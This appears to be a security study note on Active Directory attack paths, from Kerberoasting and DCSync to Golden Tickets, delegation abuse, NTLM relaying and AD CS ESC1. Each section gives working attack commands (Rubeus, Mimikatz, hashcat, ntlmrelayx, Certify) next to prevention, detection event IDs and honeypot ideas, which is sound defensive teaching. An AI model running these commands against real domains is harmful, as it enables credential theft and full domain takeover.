# Active Directory Attack Paths and Detection

Active Directory attacks often abuse legitimate identity, authentication, and administration features rather than traditional software vulnerabilities. Many of these techniques rely on weak passwords, excessive permissions, insecure delegation, exposed credentials, or misconfigured certificate templates.

This note covers common AD attack paths, how they work, what attackers need, and how defenders can prevent and detect them.

---

## Kerberoasting

**Kerberoasting** targets service accounts with registered Service Principal Names (SPNs). Any authenticated domain user can request a Kerberos service ticket for an SPN. That ticket is encrypted with the service account password hash, allowing attackers to extract it and crack it offline.

### Why It Works

When a user requests access to a Kerberos-backed service, the Domain Controller issues a **Ticket Granting Service (TGS)** ticket.

The important part is that the TGS is encrypted using the password hash of the service account that owns the SPN.

Attackers abuse this by:

- Finding accounts with SPNs
- Requesting TGS tickets for those accounts
- Exporting the ticket hashes
- Cracking them offline

No interaction with the actual service host is required.

### Encryption Types

| Encryption Type | Risk |
|---|---|
| RC4 | Weak and fast to crack |
| AES-128 / AES-256 | Much slower to crack |
| DES | Legacy and insecure |

Attackers often try to obtain RC4-encrypted tickets because they are much faster to crack.

### Attack Path

Enumerate and extract TGS hashes with Rubeus:

```powershell
.\Rubeus.exe kerberoast /outfile:spn.txt
```

Crack with Hashcat:

```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile cracked.txt
```

Crack with John:

```bash
sudo john spn.txt --format=krb5tgs --wordlist=passwords.txt
```

### Prevention

Use strong, random service account passwords. Service accounts should have long passwords, ideally 25+ characters.

Use **Group Managed Service Accounts (gMSA)** where possible. These accounts are managed by AD and automatically rotate long, complex passwords.

Disable or restrict RC4 where possible and prefer AES Kerberos encryption.

Remove unnecessary SPNs from accounts that do not need them.

### Detection

Monitor **Event ID 4769**: Kerberos service ticket requested.

Detection ideas:

- A single user requesting many unique service tickets in a short time
- RC4 tickets in an environment that should use AES
- TGS requests from unusual workstations or subnets
- Requests for sensitive or fake service accounts

### Honeypot Idea

Create a fake service account with an SPN, no real privileges, and a strong password.

Example:

```text
svc_backup_legacy
```

Any TGS request for this account should be treated as suspicious.

---

## AS-REProasting

**AS-REProasting** targets accounts that have Kerberos preauthentication disabled. If preauthentication is not required, an attacker can request authentication data for that account and crack it offline.

Unlike Kerberoasting, this attack does not require the target account to have an SPN.

### Why It Works

Normally, Kerberos requires the user to prove knowledge of their password before the KDC issues authentication material.

If the account has **Do not require Kerberos preauthentication** enabled:

- The attacker sends an AS-REQ for the target user
- The KDC responds with an AS-REP
- Part of the response is encrypted with the user password hash
- The attacker cracks it offline

### Attack Path

Extract vulnerable AS-REP hashes with Rubeus:

```powershell
.\Rubeus.exe asreproast /outfile:asrep.txt
```

Crack with Hashcat:

```bash
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

### Prevention

Disable **Do not require Kerberos preauthentication** unless there is a real legacy requirement.

Regularly audit accounts for this setting.

Use strong passwords for any account that must keep this setting enabled.

### Detection

Monitor **Event ID 4768**: Kerberos authentication ticket requested.

Detection ideas:

- Pre-authentication type is `0`
- RC4 encryption requested where AES is expected
- One source requesting TGTs for many users
- Authentication attempts against decoy users

### Honeypot Idea

Create a fake account with preauthentication disabled and a strong password.

Example:

```text
backup_svc_legacy
```

Any TGT request for this user is suspicious.

---

## GPP Passwords

**Group Policy Preferences (GPP)** used to allow administrators to store credentials for local users, scheduled tasks, mapped drives, and services inside XML files in SYSVOL.

These passwords were stored as `cpassword` values. Microsoft encrypted them with AES-256, but the private key was published publicly. As a result, any authenticated domain user can read and decrypt exposed GPP passwords.

### Why It Works

GPP credential files may exist in SYSVOL:

```text
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

Common files include:

```text
Groups.xml
ScheduledTasks.xml
Services.xml
Drives.xml
DataSources.xml
Printers.xml
```

SYSVOL is readable by authenticated users, so any domain user can search for `cpassword`.

### Attack Path

Use PowerSploit:

```powershell
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

Example output:

```text
UserName  : svc-iis
Password  : abcd@123
File      : \\EAGLE.LOCAL\SYSVOL\...\Groups.xml
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ...
```

### Prevention

Install the Microsoft patch that prevents new GPP passwords from being created.

Manually clean up old XML files containing `cpassword`.

Use **LAPS** or another password management solution instead of GPP for local administrator passwords.

Search SYSVOL for exposed credentials:

```powershell
Get-ChildItem "\\domain.local\SYSVOL" -Recurse -Include *.xml | Select-String "cpassword"
```

### Detection

Enable file access auditing on SYSVOL.

Monitor **Event ID 4663** for suspicious reads of XML files inside SYSVOL policies.

Watch for logon attempts using accounts discovered in old GPP files.

### Honeypot Idea

Place a fake GPP-style XML file in SYSVOL containing a fake credential.

Alert on:

- File reads of the fake XML
- Failed logons using the fake account
- Any authentication attempt for the decoy user

---

## GPO Permissions and GPO Files

**Group Policy Objects (GPOs)** control domain-wide configuration. If attackers can edit a GPO or replace files referenced by a GPO, they can execute code across many machines.

### Weak GPO Delegation

A GPO may grant edit rights to users or groups that should not have them.

Dangerous permissions include:

- Edit settings
- Modify security
- WriteDACL
- GenericAll
- GenericWrite

If a low-privileged user can edit a GPO linked to a sensitive OU, they can add:

- Startup scripts
- Logon scripts
- Scheduled tasks
- Software installation payloads

### Weak Referenced File Permissions

Even if the GPO itself is secure, the files it references may not be.

Example:

```text
\\fileserver\deploy\install_chrome.msi
\\domain.local\SYSVOL\scripts\logon.bat
```

If attackers can overwrite these files, the GPO may execute their payload.

### Prevention

Restrict who can edit GPOs.

Do not delegate GPO control to broad groups.

Protect scripts and installers referenced by GPOs.

Ensure GPOs linked to Domain Controllers or Tier 0 systems are managed only by Tier 0 administrators.

### Detection

Monitor **Event ID 5136** for directory object modifications.

Focus on objects where:

```text
ObjectClass = groupPolicyContainer
```

Alert when the modifying account is not an approved administrator or change management account.

### Honeypot Idea

Create an unlinked GPO with a tempting name:

```text
Legacy_Admin_Scripts
Workstation_Patch_Deploy
```

Give it intentionally weak edit permissions, but do not link it to production OUs.

Alert on any modification to that GPO.

---

## Credentials in Network Shares

Plaintext credentials are often found in scripts and configuration files stored on network shares. This is one of the most common AD misconfigurations.

### Common Causes

Credentials appear in shares because of:

- Hardcoded service passwords
- Temporary admin scripts
- Old deployment files
- Web application configs
- Backup scripts
- Mapped drive scripts
- Over-permissive shares

Hidden shares ending in `$` are not secure. They are only hidden from casual browsing.

### Common File Types

| File Type | Why It Matters |
|---|---|
| `.ps1` | PowerShell scripts may contain credentials |
| `.bat` / `.cmd` | Legacy admin scripts |
| `.config` | Web or application connection strings |
| `.xml` | Application settings or GPP leftovers |
| `.ini` | Service configuration |
| `.txt` | Notes, passwords, temporary files |

### Attack Path

Find readable shares with PowerView:

```powershell
Invoke-ShareFinder -Domain eagle.local -ExcludeStandard -CheckShareAccess
```

Search files with native Windows tools:

```powershell
findstr /s /i /m "password" *.config *.xml *.ini *.txt
```

Search for domain references:

```powershell
findstr /s /i "eagle" *.ps1 *.bat
```

### Prevention

Remove broad access from sensitive shares.

Avoid granting access to:

```text
Everyone
Authenticated Users
Domain Users
```

Use a secrets management system instead of hardcoded credentials.

Regularly scan shares for keywords such as:

```text
password
passwd
pwd
secret
token
apikey
connectionString
```

### Detection

Look for one workstation connecting to many shares or many hosts over SMB in a short time.

Alert on authentication attempts using accounts that only appear in decoy files.

### Honeypot Idea

Create a fake script on a readable share:

```powershell
# db_connect.ps1
$user = "eagle\svc_sql_backup"
$pass = "Winter2020!"
```

The password should be fake.

Alert on failed logons for:

```text
svc_sql_backup
```

---

## Credentials in Object Properties

Administrators sometimes store passwords in AD object fields such as **Description**, **Info**, or **Comment**.

The problem is that most authenticated users can read these fields by default.

### Common Fields

| Field | Risk |
|---|---|
| Description | Often contains notes or passwords |
| Info | Can contain admin notes |
| Comment | May contain setup details |
| Notes | Sometimes used for service account instructions |

### Attack Path

Search user object properties:

```powershell
Get-ADUser -Filter {Description -like "*pass*" -or Info -like "*pass*"} -Properties Description,Info | Select-Object Name,Description,Info
```

Example finding:

```text
SamAccountName : bonni
Description    : pass: Slavi123
```

### Prevention

Scan AD for sensitive keywords.

Remove passwords from object properties immediately.

Educate administrators that AD properties are readable by domain users.

Use password vaulting and documented identity management workflows.

### Detection

Reading AD object properties is noisy and difficult to detect directly.

Instead, monitor:

- Logons using accounts found in suspicious descriptions
- Service accounts logging in from unusual systems
- Object modifications that add suspicious text to Description or Info fields

Relevant events:

| Event ID | Meaning |
|---|---|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4738 | User account changed |
| 4768 | Kerberos TGT requested |

### Honeypot Idea

Create a fake account with a fake password in the description:

```text
svc_hr_backup
Description: Backup Service - Pass: P@ssw0rd123!
```

The real password should be different and complex.

Alert on any logon attempt for the honeypot account.

---

## DCSync

**DCSync** allows an attacker to impersonate a Domain Controller and request password replication data from another Domain Controller.

It does not require malware execution on the DC. Instead, it abuses legitimate Active Directory replication behavior.

### Required Rights

An account needs replication privileges on the domain object:

| Right | Meaning |
|---|---|
| DS-Replication-Get-Changes | Replicate directory changes |
| DS-Replication-Get-Changes-All | Replicate sensitive data, including password hashes |

By default, Domain Admins, Enterprise Admins, and Domain Controllers have these rights.

Some sync or service accounts may also have them.

### Attack Path

Dump a specific user hash with Mimikatz:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

Dump many domain credentials:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /all
```

Example output:

```text
SAM Username : Administrator
Hash NTLM    : fcdc65703dd2b0bd789977f1f3eeaecf
```

### Prevention

Audit who has replication rights on the domain root.

Remove replication rights from accounts that do not strictly need them.

Restrict replication traffic so only known Domain Controllers can perform replication.

Use RPC filtering where possible.

### Detection

Monitor **Event ID 4662**.

Look for:

```text
Access Mask: 0x100
```

And replication GUIDs:

```text
1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
```

Alert when the requesting account is not:

- A Domain Controller computer account
- An approved directory sync account

---

## Golden Ticket Attack

A **Golden Ticket** is a forged Kerberos Ticket Granting Ticket created using the `krbtgt` account hash.

If attackers obtain the `krbtgt` hash, they can create Kerberos tickets for any user, with any group membership, for almost any lifetime.

### Why It Works

The `krbtgt` account signs Kerberos TGTs.

If an attacker has the `krbtgt` hash, they can create TGTs that the Domain Controller treats as valid.

Golden Tickets can be used to:

- Impersonate Domain Admins
- Create tickets for nonexistent users
- Maintain long-term persistence
- Access domain resources even after user password changes

### Attack Path

Dump the `krbtgt` hash:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```

Forge and inject a ticket:

```powershell
mimikatz # kerberos::golden /domain:eagle.local /sid:<Domain_SID> /rc4:<KRBTGT_HASH> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

Verify ticket cache:

```powershell
klist
```

Access a domain resource:

```powershell
dir \\dc1\c$
```

### Prevention

Protect the `krbtgt` account hash as a Tier 0 secret.

Limit who can perform DCSync.

Use privileged access workstations for domain administration.

Rotate the `krbtgt` password twice if compromise is suspected.

The password must be changed twice because AD keeps the current and previous `krbtgt` secrets for ticket validation during replication.

### Detection

Monitor for:

- Kerberos tickets with abnormal lifetimes
- RC4 tickets in AES-only environments
- Privileged tickets used from non-admin workstations
- TGS requests for nonexistent users
- Domain Admin activity from unexpected hosts

Relevant event:

```text
Event ID 4769
```

---

## Kerberos Constrained Delegation

**Kerberos Constrained Delegation (KCD)** allows a service account to impersonate users only to specific services. If attackers compromise a service account trusted for constrained delegation, they can impersonate privileged users to the allowed target services.

### Delegation Types

| Type | Description | Risk |
|---|---|---|
| Unconstrained Delegation | Can impersonate users to any service | Critical |
| Constrained Delegation | Can impersonate users to specific services | High |
| Resource-Based Constrained Delegation | Target controls who can delegate to it | High |

### S4U Flow

KCD abuse uses Kerberos S4U extensions.

| Step | Meaning |
|---|---|
| S4U2Self | Service asks for a ticket to itself on behalf of another user |
| S4U2Proxy | Service exchanges that ticket for a ticket to an allowed target service |

### Attack Path

Find users trusted for delegation:

```powershell
Get-NetUser -TrustedToAuth
```

Convert password to NTLM hash:

```powershell
.\Rubeus.exe hash /password:Slavi123
```

Request a delegated ticket:

```powershell
.\Rubeus.exe s4u /user:webservice /rc4:<NTLM_HASH> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

Check tickets:

```powershell
klist
```

Use PowerShell Remoting if the ticket is for HTTP/WinRM:

```powershell
Enter-PSSession dc1
```

### Prevention

Mark Tier 0 accounts as:

```text
Account is sensitive and cannot be delegated
```

Place privileged users in the **Protected Users** group where appropriate.

Do not allow delegation to Domain Controllers unless absolutely required.

Use long, random passwords for service accounts.

### Detection

Monitor **Event ID 4624**.

Look for populated **Transited Services** fields.

Alert on privileged users authenticating through service accounts from unusual systems.

---

## Print Spooler and NTLM Relaying

The **PrinterBug** abuses the Windows Print Spooler service to force a machine, including a Domain Controller, to authenticate to an attacker-controlled host.

The attacker can then relay the authentication to another system if SMB signing is not enforced.

### Why It Works

The attacker triggers the remote print spooler to connect back to them using functions such as:

```text
RpcRemoteFindFirstPrinterChangeNotification
```

The victim machine then authenticates over SMB.

If the victim is a Domain Controller, the authentication uses the DC machine account.

### Attack Path

Start NTLM relay:

```bash
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

Trigger authentication:

```bash
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

Flow:

- DC1 authenticates to attacker
- Attacker relays DC1 authentication to DC2
- DC2 accepts if SMB signing is not required
- Relay tool attempts DCSync

### Prevention

Disable Print Spooler on Domain Controllers.

Enforce SMB signing.

Restrict outbound SMB from Domain Controllers to non-server networks.

Use RPC filtering where possible.

### Detection

Monitor:

- Domain Controllers initiating SMB to workstations
- Machine account logons from unexpected IPs
- Event ID 4624 where the account is a DC machine account but the source IP is not the DC

Example suspicious account:

```text
DC1$
```

---

## Coercion Attacks and Unconstrained Delegation

Coercion attacks force a target machine to authenticate to an attacker-controlled host. When combined with **Unconstrained Delegation**, attackers can capture a Domain Controller TGT and use it to perform DCSync.

### Why Unconstrained Delegation Is Dangerous

When a user or computer authenticates to a server with Unconstrained Delegation, the KDC places a copy of the client TGT in that server memory.

If attackers compromise a server with Unconstrained Delegation, they can capture delegated TGTs from users or computers that connect to it.

### Attack Path

Find computers with Unconstrained Delegation:

```powershell
Get-NetComputer -Unconstrained | Select-Object samaccountname
```

Monitor for incoming TGTs on the compromised UD server:

```powershell
.\Rubeus.exe monitor /interval:1
```

Force a DC to authenticate to the UD server:

```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Inject captured ticket:

```powershell
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

Use the DC machine account context to DCSync:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

### Prevention

Remove Unconstrained Delegation from all non-DC systems.

Replace it with Constrained Delegation or Resource-Based Constrained Delegation where required.

Block outbound SMB from Domain Controllers to workstation subnets.

Use RPC filtering to block known coercion vectors.

### Detection

Watch for:

- High volume RPC calls to Domain Controllers
- Domain Controllers initiating outbound SMB
- DC machine account logons from unusual sources
- Firewall drops from DCs to workstation subnets on port 445

---

## Object ACL Abuse

In Active Directory, object permissions are controlled by Access Control Lists. Attackers look for weak ACLs that allow them to modify users, groups, computers, or sensitive attributes.

### ACL Components

| Component | Meaning |
|---|---|
| DACL | Defines who can access the object |
| SACL | Defines what access should be audited |
| ACE | Individual permission entry |

### Dangerous Permissions

| Permission | Impact |
|---|---|
| GenericAll | Full control over the object |
| GenericWrite | Modify many object properties |
| WriteDACL | Change permissions |
| WriteOwner | Take ownership |
| ForceChangePassword | Reset a user password |
| WriteMembers | Add users to a group |
| AllExtendedRights | May allow reading sensitive attributes like LAPS passwords |

### Attack Path

Collect AD relationship data:

```powershell
.\SharpHound.exe -c All
```

Analyze in BloodHound.

Common abuse examples:

- Reset a target user password
- Add yourself to a privileged group
- Add an SPN and Kerberoast the account
- Configure Resource-Based Constrained Delegation
- Read LAPS passwords
- Modify group membership

### Prevention

Audit delegated permissions.

Avoid manual ACL delegation unless documented and required.

Protect Tier 0 accounts and groups.

Use AdminSDHolder protection for privileged users.

Keep Tier 0, Tier 1, and Tier 2 administration separated.

### Detection

Relevant events:

| Event ID | Meaning |
|---|---|
| 4738 | User account changed |
| 4742 | Computer account changed |
| 5136 | Directory service object modified |

Watch for changes to:

```text
servicePrincipalName
member
msDS-AllowedToActOnBehalfOfOtherIdentity
nTSecurityDescriptor
ms-Mcs-AdmPwd
```

### Honeypot Idea

Create a fake user with intentionally weak ACLs:

```text
svc_monitor_temp
```

Grant broad write permissions, but do not use the account.

Alert on any modification to the account.

---

## AD CS ESC1

**ESC1** is a dangerous Active Directory Certificate Services misconfiguration. It allows low-privileged users to request certificates for other identities, including Domain Admins.

### Why It Works

A certificate template is vulnerable when all of the following are true:

| Condition | Risk |
|---|---|
| Low-privileged users can enroll | Any domain user can request a certificate |
| Client Authentication EKU is enabled | Certificate can be used to authenticate |
| Enrollee supplies subject | Requester can specify another identity in the SAN |

The dangerous flag is:

```text
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
```

This allows a user to request a certificate with another user's identity in the Subject Alternative Name.

### Attack Path

Find vulnerable templates:

```powershell
.\Certify.exe find /vulnerable
```

Request a certificate as Administrator:

```powershell
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

Convert PEM to PFX:

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Request a TGT with the certificate:

```powershell
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

### Prevention

Disable **Supply in the request** on vulnerable templates.

Use **Build from this Active Directory information** instead.

Remove broad enrollment rights from sensitive templates.

Enable certificate manager approval for sensitive templates.

Regularly audit AD CS templates.

### Detection

Monitor Certificate Authority events:

| Event ID | Meaning |
|---|---|
| 4886 | Certificate request received |
| 4887 | Certificate request approved |

Monitor Domain Controller events:

| Event ID | Meaning |
|---|---|
| 4768 | TGT requested |

Detection ideas:

- Low-privileged user requests certificate for a privileged SAN
- Certificate issued and then immediately used for Kerberos authentication
- Risky template used unexpectedly
- Certificate authentication for accounts that normally do not use certificates

### Remediation

Fixing the template is not enough.

You must also:

- Identify fraudulent certificates
- Revoke them
- Investigate all use of those certificates
- Review CA logs for past abuse